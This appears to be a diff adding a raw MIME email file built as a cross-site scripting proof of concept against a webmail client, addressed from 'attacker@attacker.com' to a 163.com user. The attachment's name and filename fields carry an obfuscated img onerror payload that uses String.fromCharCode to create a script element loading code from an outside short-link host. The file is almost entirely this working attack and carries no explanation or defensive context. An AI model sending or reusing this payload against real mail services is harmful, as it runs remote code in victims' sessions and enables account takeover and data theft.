@@ -1,0 +1,26 @@
+From: <attacker@attacker.com>
+Subject: 123
+To: victim@163.com
+MIME-Version: 1.0
+Content-type: multipart/mixed;
+	boundary="----=_Part_192061_1556421578.1563869810627"
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: multipart/alternative; 
+	boundary="----=_Part_192063_26965953.1563869810627"
+
+------=_Part_192063_26965953.1563869810627
+Content-Type: text/plain; charset=GBK
+Content-Transfer-Encoding: 7bit
+
+o
+
+------=_Part_192063_26965953.1563869810627--
+
+------=_Part_192061_1556421578.1563869810627
+Content-Type: text/html; name="<img src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,49,50,54,46,97,109,47,100,84,119,65,73,48);document.body.appendChild(window.s)})()>.html"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="<img src=1 onerror=(function(){window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,49,50,54,46,97,109,47,100,84,119,65,73,48);document.body.appendChild(window.s)})()>.html"
+
+dGhpcyBpcyBhIGV4YW1wbGU=
+------=_Part_192061_1556421578.1563869810627--
